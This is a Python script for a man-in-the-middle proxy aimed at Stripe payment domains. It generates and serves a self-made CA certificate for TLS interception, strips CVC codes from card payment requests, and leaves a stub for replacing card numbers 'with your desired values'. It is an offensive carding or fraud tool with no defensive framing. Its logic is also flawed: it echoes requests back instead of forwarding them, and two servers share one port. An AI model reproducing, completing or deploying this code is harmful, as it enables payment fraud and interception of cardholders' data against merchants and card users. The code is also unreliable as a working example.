import socket
import threading
import re
import os
import ssl
from http.server import SimpleHTTPRequestHandler, HTTPServer

# Domains to intercept
STRIP_DOMAINS = ["api.stripe.com", "js.stripe.com", "m.stripe.com"]

# Proxy server configuration
PROXY_HOST = "0.0.0.0"  # Listen on all network interfaces
PROXY_PORT = int(os.environ.get("PORT", 8080))  # Use the PORT environment variable if available, else default to 8080
CERT_PATH = "/tmp/ca.pem"  # Use a temporary directory for certificate

# Function to modify request body
def modify_request_body(request_body):
    # Remove CVV codes
    request_body = re.sub(r"payment_method_data\[card\]\[cvc\]=[^&]*&?", "", request_body)
    request_body = re.sub(r"card\[cvc\]=[^&]*&?", "", request_body)
    request_body = re.sub(r"source_data\[card\]\[cvc\]=[^&]*&?", "", request_body)

    # Replace credit card numbers with your desired values
    # ...

    return request_body

# Function to handle client requests
def handle_client(client_socket):
    request_data = client_socket.recv(4096)
    # Check if request is related to Stripe domains
    if any(domain in request_data.decode() for domain in STRIP_DOMAINS):
        # Modify request body if it contains credit card data
        request_lines = request_data.split(b'\r\n')
        if any(b"payment_method_data[card][number]" in line or b"card[number]" in line or b"source_data[card][number]" in line for line in request_lines):
            modified_request_data = modify_request_body(request_data.decode()).encode()
            client_socket.send(modified_request_data)
        else:
            client_socket.send(request_data)
    else:
        client_socket.send(request_data)
    client_socket.close()

# Function to serve CA certificate over HTTPS
def serve_certificate():
    class CertHTTPRequestHandler(SimpleHTTPRequestHandler):
        def do_GET(self):
            if self.path == '/ca.pem':
                self.send_response(200)
                self.send_header('Content-type', 'application/x-x509-ca-cert')
                self.end_headers()
                with open(CERT_PATH, 'rb') as f:
                    self.wfile.write(f.read())
            else:
                super().do_GET()

    httpd = HTTPServer((PROXY_HOST, PROXY_PORT), CertHTTPRequestHandler)
    httpd.socket = ssl.wrap_socket(httpd.socket, certfile=CERT_PATH, server_side=True)
    httpd.serve_forever()

# Function to start the proxy server
def start_proxy():
    # Create a socket object
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Bind the socket to the local host and port
    server_socket.bind((PROXY_HOST, PROXY_PORT))
    # Start listening for incoming connections
    server_socket.listen(5)

    # Print the IP address and port for remote connection
    ip_address = "0.0.0.0" if PROXY_HOST == "0.0.0.0" else socket.gethostbyname(socket.gethostname())
    print(f"Proxy server is listening on {ip_address}:{PROXY_PORT}...")

    while True:
        # Accept a new connection
        client_socket, client_address = server_socket.accept()
        print(f"Accepted connection from {client_address[0]}:{client_address[1]}")
        # Handle the client request in a new thread
        client_thread = threading.Thread(target=handle_client, args=(client_socket,))
        client_thread.start()

if __name__ == "__main__":
    # Generate a CA certificate if it doesn't exist
    if not os.path.exists(CERT_PATH):
        os.system(f'openssl req -new -x509 -keyout {CERT_PATH} -out {CERT_PATH} -days 365 -nodes -subj "/CN=HRK Proxy CA"')

    # Start serving the CA certificate over HTTPS
    certificate_thread = threading.Thread(target=serve_certificate)
    certificate_thread.start()

    # Start the proxy server
    start_proxy()
            
